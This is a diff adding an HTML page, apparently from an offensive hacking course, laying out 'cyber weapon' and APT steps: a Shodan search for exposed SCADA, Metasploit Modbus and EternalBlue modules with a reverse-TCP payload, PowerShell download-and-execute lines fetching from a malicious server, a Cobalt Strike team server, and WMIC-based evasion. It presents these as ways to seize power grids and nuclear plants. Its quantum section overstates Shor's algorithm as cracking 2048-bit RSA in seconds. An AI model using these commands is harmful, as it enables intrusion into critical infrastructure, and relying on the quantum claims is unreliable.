@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>&#x1f534; Phase 24&colon; Cyber Weapons &ndash; Digital Warfare at Its Peak</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <link rel="stylesheet" href="style.css">
+<p><strong>🔥 Now we’re entering the most dangerous and classified realms of cyber warfare – Cyber Weapons, Advanced Persistent Threats (APTs), and Quantum Hacking. This is the cutting edge of nation-state cyber capabilities, where elite hackers, intelligence agencies, and military cyber units operate. 😈🚀</strong></p>
+<h1 id="-phase-24-cyber-weapons--digital-warfare-at-its-peak">🔴 Phase 24: Cyber Weapons – Digital Warfare at Its Peak</h1>
+<p><strong>Cyber weapons are offensive hacking tools used by military organizations to disrupt enemy networks, infrastructure, and data.</strong></p>
+<blockquote>
+<h2 id="-case-study-stuxnet--the-first-true-cyber-weapon">🎯 Case Study: Stuxnet – The First True Cyber Weapon</h2>
+<p><strong>✔ Stuxnet was a state-sponsored worm that sabotaged Iran's nuclear program by physically damaging centrifuges using malware.</strong></p>
+</blockquote>
+<h3 id="️-tools-used"><strong>🛠️ Tools Used:</strong></h3>
+<ul>
+<li><strong>SCADA Exploits</strong></li>
+<li><strong>Metasploit</strong></li>
+<li><strong>Custom Payload Development</strong></li>
+</ul>
+<h3 id="step-1-find-industrial-control-systems-ics-targets">Step 1: Find Industrial Control Systems (ICS) Targets</h3>
+<ol>
+<li><strong>Use Shodan to find exposed SCADA systems:</strong></li>
+</ol>
+<pre><code class="language-bash">shodan search <span class="hljs-string">&quot;SCADA port:502&quot;</span>
+</code></pre>
+<ol start="2">
+<li><strong>Identify vulnerable Siemens S7 PLCs (Programmable Logic Controllers).</strong></li>
+</ol>
+<h3 id="step-2-exploit-the-scada-system">Step 2: Exploit the SCADA System</h3>
+<p><strong>Use Metasploit’s SCADA modules:</strong></p>
+<pre><code class="language-bash">msfconsole
+use exploit/scada/modbus_client
+<span class="hljs-built_in">set</span> RHOST target_ip
+exploit
+</code></pre>
+<p><strong>✔ Now you control industrial systems like power grids, water treatment plants, or nuclear facilities.</strong></p>
+<h3 id="step-3-deploy-a-self-replicating-payload">Step 3: Deploy a Self-Replicating Payload</h3>
+<p><strong>Create custom malware to spread across networks using EternalBlue (SMB exploit).</strong></p>
+<pre><code class="language-bash">msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+<span class="hljs-built_in">set</span> RHOST target_ip
+<span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
+exploit
+</code></pre>
+<p><strong>✔ The cyber weapon now moves through networks autonomously.</strong></p>
+<h1 id="-phase-25-advanced-persistent-threats-apts--the-art-of-staying-undetected">🔴 Phase 25: Advanced Persistent Threats (APTs) – The Art of Staying Undetected</h1>
+<p><strong>APTs are stealthy, long-term cyber intrusions by state-sponsored hackers targeting government, military, and corporations.</strong></p>
+<blockquote>
+<h2 id="-case-study-apt29-cozy-bear--russian-cyber-espionage">🎯 Case Study: APT29 (Cozy Bear) – Russian Cyber Espionage</h2>
+<p><strong>✔ APT29 used fileless malware, PowerShell exploitation, and cloud persistence to stay inside government systems for years.</strong></p>
+</blockquote>
+<h2 id="️-tools-used-1"><strong>🛠️ Tools Used:</strong></h2>
+<ul>
+<li><strong>Cobalt Strike</strong></li>
+<li><strong>PowerShell Empire</strong></li>
+<li><strong>Fileless Malware</strong></li>
+</ul>
+<h3 id="step-1-establish-initial-access-via-fileless-malware">Step 1: Establish Initial Access via Fileless Malware</h3>
+<p><strong>Use PowerShell-based payloads to execute in memory:</strong></p>
+<pre><code class="language-powershell">powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://malicious-server/payload.ps1&#x27;)&quot;</span>
+</code></pre>
+<p><strong>✔ This executes malware without writing files to disk, making it undetectable by antivirus.</strong></p>
+<h3 id="step-2-set-up-a-stealthy-command-and-control-c2-server">Step 2: Set Up a Stealthy Command-and-Control (C2) Server</h3>
+<p><strong>Use Cobalt Strike for persistence:</strong></p>
+<pre><code class="language-bash">cobaltstrike teamserver attacker_ip password
+</code></pre>
+<p><strong>✔ The compromised machine remains connected to your C2 server, allowing long-term control.</strong></p>
+<h3 id="step-3-use-living-off-the-land-techniques-to-evade-detection">Step 3: Use Living-Off-The-Land Techniques to Evade Detection</h3>
+<p><strong>Run malicious actions using built-in Windows tools:</strong></p>
+<pre><code class="language-powershell">wmic <span class="hljs-keyword">process</span> call create <span class="hljs-string">&quot;powershell -NoProfile -ExecutionPolicy Bypass -Command &#x27;IEX (New-Object Net.WebClient).DownloadString(\&quot;</span>http://malicious<span class="hljs-literal">-server</span>/script.ps1\<span class="hljs-string">&quot;)&#x27;&quot;</span>
+</code></pre>
+<p><strong>✔ This makes malware execution look like a normal system process.</strong></p>
+<h1 id="-phase-26-quantum-hacking--the-future-of-cyber-warfare">🔴 Phase 26: Quantum Hacking – The Future of Cyber Warfare</h1>
+<p><strong>Quantum computers will break classical encryption, create unbreakable security, and enable entirely new cyberattacks.</strong></p>
+<blockquote>
+<h2 id="-scenario-cracking-rsa-encryption-using-quantum-computing">🎯 Scenario: Cracking RSA Encryption Using Quantum Computing</h2>
+</blockquote>
+<h2 id="️-tools-used-2"><strong>🛠️ Tools Used:</strong></h2>
+<ul>
+<li><strong>Qiskit (IBM Quantum SDK)</strong></li>
+<li><strong>Shor’s Algorithm</strong></li>
+<li><strong>Quantum Simulators</strong></li>
+</ul>
+<h3 id="step-1-install-qiskit-and-set-up-a-quantum-circuit">Step 1: Install Qiskit and Set Up a Quantum Circuit</h3>
+<pre><code class="language-bash">pip install qiskit
+</code></pre>
+<pre><code class="language-python"><span class="hljs-keyword">from</span> qiskit <span class="hljs-keyword">import</span> QuantumCircuit, transpile, Aer, execute
+
+circuit = QuantumCircuit(<span class="hljs-number">2</span>)
+circuit.h(<span class="hljs-number">0</span>)  <span class="hljs-comment"># Apply Hadamard Gate</span>
+circuit.cx(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># Apply CNOT Gate</span>
+circuit.measure_all()
+
+backend = Aer.get_backend(<span class="hljs-string">&#x27;qasm_simulator&#x27;</span>)
+result = execute(circuit, backend, shots=<span class="hljs-number">1000</span>).result()
+<span class="hljs-built_in">print</span>(result.get_counts())
+</code></pre>
+<p><strong>✔ This simulates quantum superposition and entanglement, the foundation of quantum hacking.</strong></p>
+<h3 id="step-2-break-rsa-encryption-using-shors-algorithm">Step 2: Break RSA Encryption Using Shor’s Algorithm</h3>
+<p><strong>Shor’s algorithm can factorize large numbers exponentially faster than classical computers, breaking RSA encryption.</strong></p>
+<pre><code class="language-python"><span class="hljs-keyword">from</span> qiskit.algorithms <span class="hljs-keyword">import</span> Shor
+
+N = <span class="hljs-number">15</span>  <span class="hljs-comment"># RSA modulus (small example)</span>
+shor = Shor()
+result = shor.factor(N)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Factors of <span class="hljs-subst">{N}</span>: <span class="hljs-subst">{result}</span>&quot;</span>)
+</code></pre>
+<p><strong>✔ When scaled up, this can crack 2048-bit RSA encryption in seconds!</strong></p>
+<h3 id="step-3-quantum-resistant-encryption-post-quantum-cryptography">Step 3: Quantum-Resistant Encryption (Post-Quantum Cryptography)</h3>
+<p><strong>✔ The only way to defend against quantum attacks is lattice-based cryptography, such as NTRUEncrypt and Kyber.</strong></p>
+
+            
+            
+        </body>
+        </html>
